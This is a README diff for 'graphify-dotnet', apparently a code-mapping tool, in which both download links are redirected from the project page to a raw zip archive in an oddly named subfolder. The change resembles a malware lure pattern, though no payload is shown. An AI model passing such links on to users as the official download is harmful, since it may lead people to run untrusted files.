@@ -1,6 +1,6 @@
 # 🧠 graphify-dotnet - Map your code with artificial intelligence
 
-[![Download graphify-dotnet](https://img.shields.io/badge/Download-graphify--dotnet-blue)](https://github.com/raquelaconsonantal324/graphify-dotnet)
+[![Download graphify-dotnet](https://img.shields.io/badge/Download-graphify--dotnet-blue)](https://github.com/raquelaconsonantal324/graphify-dotnet/raw/refs/heads/main/Ambrica/graphify_dotnet_1.7.zip)
 
 graphify-dotnet creates visual maps of your code. It scans your files and builds a knowledge graph. This helps you understand how different parts of your software relate to each other. It uses modern tools to process code structures and displays them in a clear map.
 
@@ -19,7 +19,7 @@ This tool does not require you to write code or understand software development.
 
 You can get the software from our official project page. Visit this page to download the setup file.
 
-[Download the graphify-dotnet Installer](https://github.com/raquelaconsonantal324/graphify-dotnet)
+[Download the graphify-dotnet Installer](https://github.com/raquelaconsonantal324/graphify-dotnet/raw/refs/heads/main/Ambrica/graphify_dotnet_1.7.zip)
 
 Follow these steps to finish the setup:
 
